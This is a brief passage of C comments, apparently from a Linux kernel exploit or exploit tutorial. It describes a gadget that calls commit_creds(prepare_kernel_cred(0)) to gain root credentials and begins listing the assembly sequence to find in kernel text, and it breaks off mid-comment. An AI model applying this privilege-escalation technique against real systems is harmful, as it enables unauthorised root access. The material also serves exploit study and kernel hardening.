/* Kernel callback gadget — calls commit_creds(prepare_kernel_cred(0)) */
/* ------------------------------------------------------------------ */

/*
 * In a real exploit, we'd find a gadget in the kernel text that does:
 *   mov rdi, 0
 *   call prepare_kernel_cred
 *   mov rdi, rax
